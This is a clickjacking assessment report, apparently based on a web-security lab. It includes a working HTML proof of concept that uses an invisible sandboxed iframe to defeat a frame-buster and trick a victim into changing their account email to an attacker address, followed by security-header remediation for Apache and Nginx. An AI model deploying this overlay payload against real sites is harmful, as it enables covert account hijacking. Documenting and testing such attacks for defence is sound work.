# Security Assessment Report: Landing Page & Static Site Audit
## 1. Executive Summary

During the security evaluation of the static/landing page infrastructure, a critical vulnerability known as Clickjacking (UI Redress Attack) was identified. The application fails to enforce frame protection HTTP headers (X-Frame-Options or Content-Security-Policy: frame-ancestors).

Even with a basic client-side JavaScript frame-buster present, an attacker can neutralize the protection using the HTML5 iframe sandbox="allow-forms" attribute. By overlaying an invisible iframe over an enticing decoy button ("click me"), an attacker can deceive users into performing unintended high-privilege actions (such as changing account emails) without their knowledge.
## 2. Vulnerability Details

    Vulnerability Class: Client-Side Enforcement / Misconfiguration

    Vulnerability Type: Clickjacking (UI Redress Attack) via Frame Buster Bypass

    Severity: Medium / High

    Target Endpoint: /my-account (Account email update action)

    Missing Security Headers: X-Frame-Options, Content-Security-Policy (CSP)

Root Cause Analysis:

    Missing Security Headers: The web server does not send the X-Frame-Options: DENY or X-Frame-Options: SAMEORIGIN header, allowing external domains to render the page inside an <iframe>.

    Inadequate Client-Side Defense: The target site attempts to prevent framing using a JavaScript "frame-buster" script. However, client-side defenses can be easily bypassed by disabling top-level navigation within the iframe sandbox (sandbox="allow-forms").

    Business & Security Impact: Attackers can host malicious pages that frame the client's landing page or forms, tricking visiting users into performing unauthorized state-changing operations or submitting sensitive input to the attacker.

## 3. Proof of Concept & Step-by-Step Exploitation
Step 1: Crafting the Exploitation Payload

An HTML exploit page was created using CSS opacity manipulation (opacity: 0.0005) to make the framed target site invisible while aligning a fake "Click me" button directly over the target's "Update email" button.

The HTML5 iframe sandbox="allow-forms" attribute was added to disable the target's frame-buster script while permitting form submission:

   HTML

<style>
    iframe {
        position: relative;
        width: 1000px;
        height: 1000px;
        opacity: 0.0005;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 465px;
        left: 50px;
        z-index: 1;
    }
</style>

<div>click me</div>
<iframe sandbox="allow-forms" src="https://target-app.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>

Step 2: Exploit Preview & Alignment Verification

Testing the payload locally confirms that the decoy text ("click me") perfectly aligns over the invisible form button of the framed target application.

<img width="1189" height="629" alt="15" src="https://github.com/user-attachments/assets/2db297f7-71ae-4ab9-a29b-b3587c5184a9" />

Step 3: Social Engineering Delivery & Execution

The exploit page is hosted on an attacker-controlled domain and sent to the target user. To the victim, the page appears as a harmless page with a simple "click me" button.

<img width="1189" height="629" alt="11" src="https://github.com/user-attachments/assets/bd73ab41-ff96-486f-93eb-33f823d27b41" />

When the victim clicks the button, the click penetrates the transparent iframe overlay, submitting the email update form and changing the victim's account email address to hacker@attacker-website.com.
## 4. Security Headers & SSL Baseline Audit
In addition to Clickjacking, static landing pages must enforce core security headers to protect against framing, MIME-sniffing, and cross-site scripting:

| Security Header | Current Status | Recommended Configuration |
|----------------|----------------|---------------------------|
| X-Frame-Options | ❌ Missing | `X-Frame-Options: SAMEORIGIN` |
| Content-Security-Policy | ❌ Missing | `Content-Security-Policy: frame-ancestors 'self';` |
| X-Content-Type-Options | ❌ Missing | `X-Content-Type-Options: nosniff` |
| Strict-Transport-Security (HSTS) | ⚠️ Optional/Unverified | `Strict-Transport-Security: max-age=31536000; includeSubDomains` |

Client Note: "Clickjacking occurs when an attacker uses transparent layers to trick a user into clicking a button or link on another page when they were intending to click on the top-level page. Without server-side HTTP security headers (X-Frame-Options or CSP), your website can be embedded into malicious third-party websites, exposing your users to covert form submissions and account hijacking."

## 6. Remediation & Server Hardening Code

To fix this vulnerability immediately, add the proper security headers directly to your web server configuration. Do NOT rely on JavaScript frame-busters.
Option A: Apache Server (.htaccess or httpd.conf)

Add the following lines to your .htaccess file:

```apache
<IfModule mod_headers.c>
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set Content-Security-Policy "frame-ancestors 'self';"
    Header always set X-Content-Type-Options "nosniff"
</IfModule>
```
Option B: Nginx Server (nginx.conf)

Add the following directives inside your server or location block:
```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "frame-ancestors 'self';" always;
add_header X-Content-Type-Options "nosniff" always;
```
